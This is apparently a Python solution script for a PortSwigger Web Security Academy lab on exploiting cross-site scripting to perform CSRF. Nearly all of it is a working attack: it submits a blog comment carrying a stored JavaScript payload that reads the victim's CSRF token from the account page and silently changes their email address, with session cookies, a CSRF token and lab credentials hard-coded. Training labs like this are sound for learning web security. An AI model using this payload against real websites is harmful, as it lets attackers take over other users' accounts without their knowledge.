# https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
import requests

requests.packages.urllib3.disable_warnings()

verify = False
proxy = "127.0.0.1:8080"
scheme = "https://"
proxies = {scheme: proxy}
host = "aca51f601f683a0780f59b87006300ec.web-security-academy.net"

# I don't think that i can automate the logging in
# path = "/login"
# url = scheme + host + path
# session_cookie = "ab2ESNqdXKnN136R7aLj6GSGJ6NHVbeT"
# cookies = {"session": session_cookie}
# data = {
#     "csrf": "Vh8x6LBxEuebsg6DWIKbQ2bYmNw4hOKp",
#     "username": "wiener",
#     "password": "peter",
# }
#
# requests.post(url, verify=verify, proxies=proxies, cookies=cookies, data=data)


payload = """
<script>
var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest(); 
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
"""

data = {
    "csrf": "CZpliRutzOGPZpLCXuPuRxBJ7anUdTaI",
    "postId": "5",
    "comment": payload,
    "name": "test",
    "email": "test@email.com",
    "website": "http://test.com",
}

session_cookie = "ab2ESNqdXKnN136R7aLj6GSGJ6NHVbeT"
cookies = {"session": session_cookie}
path = "/post/comment"
url = scheme + host + path
requests.post(url, verify=verify, proxies=proxies, cookies=cookies, data=data)

# Payload:
# <p>
# <script>
# var req = new XMLHttpRequest();
# req.onload = handleResponse;
# req.open('get','/my-account',true);
# req.send();
# function handleResponse() {
#     var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
#     var changeReq = new XMLHttpRequest();
#     changeReq.open('post', '/my-account/change-email', true);
#     changeReq.send('csrf='+token+'&email=test@test.com')
# };
# </script>
# </p>
